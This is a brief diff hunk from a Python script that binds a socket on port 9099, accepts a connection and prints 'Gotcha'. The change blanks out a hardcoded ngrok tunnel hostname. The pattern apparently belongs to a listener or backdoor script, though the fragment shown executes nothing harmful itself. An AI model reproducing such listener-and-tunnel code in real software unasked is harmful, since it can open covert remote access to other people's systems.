@@ -19,7 +19,7 @@ s = socket.socket(2, 1)
 s.bind(('', 9099))
 s.listen(5)
 client, addr = s.accept()
-ip = "035e-92-118-74-46.ngrok-free.app"
+ip = ""
 print("Gotcha")
 del s
 time.sleep(10)
